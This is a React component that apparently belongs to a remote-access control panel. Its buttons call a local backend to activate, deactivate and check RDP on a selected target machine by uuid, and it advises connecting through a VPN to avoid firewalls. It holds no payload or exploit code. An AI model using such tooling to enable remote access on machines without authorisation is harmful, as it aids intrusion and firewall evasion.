import {User} from "@/Interfaces/User.ts";
import { useState, useRef } from "react";

export function RdpButtons(
    {
        typeOutput,
        selectedUser,
        clearConsole,
        setOutput
    }:
        {
            typeOutput: (text: string) => Promise<void>,
            selectedUser: User | null,
            clearConsole: () => void,
            setOutput: (value: React.SetStateAction<string[]>) => void
        }
) {

    const startRdp = async () => {
        await typeOutput("> Activating RDP, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/rdp/activate?id=" + selectedUser?.uuid, { method: "POST" });
        
        if (!response.ok) {
            const errorData = await response.json();
            await typeOutput(`> Failed to activate RDP: ${errorData.detail || response.statusText}`);
            return;
        }
        await typeOutput("> RDP activated. Connect using your own preferences. Preferably a VPN to avoid additional firewalls, check the VPN module in order to proceed.");
    };

    const stopRdp = async () => {
        await typeOutput("> Deactivating RDP, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/rdp/deactivate?id=" + selectedUser?.uuid, { method: "POST" });
        
        if (!response.ok) {
            const errorData = await response.json();
            await typeOutput(`> Failed to deactivate RDP: ${errorData.detail || response.statusText}`);
            return;
        }
        await typeOutput("> RDP deactivated.");
    };

    const statusRdp = async () => {
        await typeOutput("> Retrieving RDP status, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/rdp/status?id=" + selectedUser?.uuid);
        
        if (!response.ok) {
            const errorData = await response.json();
            await typeOutput(`> Failed to get RDP status: ${errorData.detail || response.statusText}`);
            return;
        }
        await typeOutput("> " + (await response.json()).message);

    };

    return (
        <div>
            <button
                onClick={() => startRdp()}
                className="mr-4 border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Activate RDP</p>
            </button>

            <button
                onClick={() => stopRdp()}
                className="mr-4 p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
                <p>Deactivate RDP</p>
            </button>

            <button
                onClick={() => statusRdp()}
                className="border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Status</p>
            </button>

        </div>
    );
}

export default RdpButtons;